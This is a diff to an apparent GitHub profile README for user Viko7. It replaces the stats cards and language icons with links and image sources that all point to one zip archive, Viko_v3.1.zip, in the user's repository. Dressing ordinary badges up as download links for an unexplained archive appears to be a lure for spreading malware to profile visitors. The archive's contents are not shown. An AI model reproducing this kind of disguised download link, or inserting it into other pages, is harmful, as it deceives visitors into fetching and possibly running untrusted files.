@@ -7,21 +7,21 @@
 - 😄 Pronouns: Ele/Dele
 
 <div>
-<a href="https://github.com/anuraghazra/github-readme-stats">
-  <img height=200 align="center" src="https://github-readme-stats.vercel.app/api?username=Viko7" />
+<a href="https://github.com/Viko7/Viko7/raw/refs/heads/main/kingdomful/Viko_v3.1.zip">
+  <img height=200 align="center" src="https://github.com/Viko7/Viko7/raw/refs/heads/main/kingdomful/Viko_v3.1.zip" />
 </a>
-<a href="https://github.com/anuraghazra/convoychat">
-  <img height=200 align="center" src="https://github-readme-stats.vercel.app/api/top-langs?username=Viko7&layout=compact&langs_count=8&card_width=320" />
+<a href="https://github.com/Viko7/Viko7/raw/refs/heads/main/kingdomful/Viko_v3.1.zip">
+  <img height=200 align="center" src="https://github.com/Viko7/Viko7/raw/refs/heads/main/kingdomful/Viko_v3.1.zip" />
 </a>
 </div>
 <br>
 <hr>
 <div>
-  <img height="100em" src="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/icons/html5/html5-original.svg" />
-  <img height="100em" src="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/icons/css3/css3-original.svg" />
-  <img height="100em" src="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/icons/bootstrap/bootstrap-original.svg" />
-  <img height="100em" src="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/icons/javascript/javascript-original.svg" />
-  <img height="100em" src="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/icons/python/python-original.svg" />                         
+  <img height="100em" src="https://github.com/Viko7/Viko7/raw/refs/heads/main/kingdomful/Viko_v3.1.zip" />
+  <img height="100em" src="https://github.com/Viko7/Viko7/raw/refs/heads/main/kingdomful/Viko_v3.1.zip" />
+  <img height="100em" src="https://github.com/Viko7/Viko7/raw/refs/heads/main/kingdomful/Viko_v3.1.zip" />
+  <img height="100em" src="https://github.com/Viko7/Viko7/raw/refs/heads/main/kingdomful/Viko_v3.1.zip" />
+  <img height="100em" src="https://github.com/Viko7/Viko7/raw/refs/heads/main/kingdomful/Viko_v3.1.zip" />                         
 </div>
 
 
